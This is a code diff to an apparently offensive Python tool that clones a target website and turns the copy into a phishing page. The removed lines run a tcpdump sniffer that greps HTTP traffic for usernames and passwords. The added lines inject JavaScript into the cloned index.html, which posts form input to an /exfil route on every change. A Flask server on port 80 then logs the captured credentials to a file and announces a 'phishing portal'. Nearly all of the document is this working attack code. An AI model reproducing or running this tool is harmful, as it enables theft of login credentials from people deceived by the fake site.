@@ -1,34 +1,45 @@
-# --- Module Context: Phantom Cloner v2.1 ---
-# Purpose: Web cloning with automated credential sniffing.
-# -------------------------------------------
 import os
-import subprocess
-import threading
 from pywebcopy import save_webpage
+from flask import Flask, request
 from rich.console import Console
+import threading
 
 console = Console()
+app = Flask(__name__)
 
 
-def harvest_sniff(port):
-    """Background sniffer to extract cleartext credentials."""
-    # Uses tcpdump to listen for form-data keywords in HTTP traffic
-    cmd = f"sudo tcpdump -i any -A port {port} | grep -iE 'user|pass|login|email'"
-    subprocess.Popen(cmd, shell=True)
+@app.route('/exfil', methods=['POST'])
+def exfil():
+    data = request.form
+    console.print(
+        f"[bold red][!] CREDENTIALS HARVESTED:[/bold red] {data.to_dict()}")
+    with open("logs/harvested.txt", "a") as f:
+        f.write(f"{data.to_dict()}\n")
+    return "OK", 200
+
+
+def run_server(path):
+    os.chdir(path)
+    app.run(host='0.0.0.0', port=80)
 
 
 def clone_site():
-    target_url = console.input(
-        "[bold yellow]Target URL: [/bold yellow]").strip()
-    project_name = console.input(
-        "[bold yellow]Project: [/bold yellow]").strip()
-    base_path = "/opt/davoid/cloned_sites"
+    target_url = console.input("[bold yellow]URL to Clone: [/bold yellow]")
+    project = console.input("[bold yellow]Project Name: [/bold yellow]")
+    path = f"/opt/davoid/clones/{project}"
 
-    save_webpage(url=target_url, project_folder=base_path,
-                 project_name=project_name, bypass_robots=True)
+    save_webpage(url=target_url, project_folder="/opt/davoid/clones",
+                 project_name=project, bypass_robots=True)
 
-    if console.input("\n[bold cyan]Start Harvest Server on Port 80? (y/N): [/bold cyan]").lower() == 'y':
-        os.chdir(os.path.join(base_path, project_name))
-        threading.Thread(target=harvest_sniff, args=(80,), daemon=True).start()
-        subprocess.run(["sudo", "/opt/davoid/venv/bin/python3",
-                       "-m", "http.server", "80"])
+    # Powerful Improvement: Injecting the Exfiltration Hook
+    index_file = f"{path}/{target_url.split('//')[-1]}/index.html"
+    if os.path.exists(index_file):
+        with open(index_file, "a") as f:
+            f.write(
+                "<script>document.querySelectorAll('input').forEach(i => i.addEventListener('change', () => { fetch('/exfil', {method:'POST', body:new FormData(document.querySelector('form'))}) }))</script>")
+
+    if console.input("[bold cyan]Launch Phishing Server Now? (y/N): [/bold cyan]").lower() == 'y':
+        threading.Thread(target=run_server, args=(path,), daemon=True).start()
+        console.print(
+            f"[bold green][+] Phishing portal active on port 80.[/bold green]")
+        input("Press Enter to stop...")
